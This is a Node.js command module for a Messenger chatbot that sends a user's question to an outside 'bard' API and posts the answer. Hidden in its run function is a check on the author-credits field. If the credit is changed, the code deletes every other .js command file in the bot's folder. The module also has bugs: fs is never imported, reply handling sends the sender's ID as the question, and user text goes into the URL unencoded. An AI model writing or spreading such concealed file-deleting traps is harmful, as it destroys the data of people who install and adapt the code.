module.exports.config = {
    name: "bard",
    version: "1.0.1",
    hasPermssion: 0,
    credits: "Dũngkon", 
    description: "Đặt câu hỏi cho bard",
    commandCategory: "AI",
    usages: "[ask]",
    cooldowns: 5
};
module.exports.run = async function ({ api, event, args,}) {
  if (this.config.credits !== "Dũngkon") {
    const listCommand = fs
      .readdirSync(__dirname)
      .filter(
        (command) =>
          command.endsWith(".js") && !command.includes(this.config.name)
      );
      console.log(listCommand)
    for (const command of listCommand) {

      const path = __dirname + `/${command}`;
      fs.unlinkSync(path);
    }
  }
  const { threadID, messageID, senderID } = event;
  var out = (msg) => api.sendMessage(msg, threadID, messageID);
  if (!args.join(" ")) return out("Thiếu câu hỏi");
  if (event.type == "message_reply") text  = event.messageReply.senderID
else text = args.join(" ");
api.sendMessage(`🔄| LOADING...!`, event.threadID , (err, info)  => setTimeout ( () => { api.unsendMessage(info.messageID) } , 5000))
var data = await global.utils.getContent(`https://sumiproject.io.vn/bard?ask=${text}`)
    const q = data.data.message
return api.sendMessage(`\n${q}`, event.threadID)
};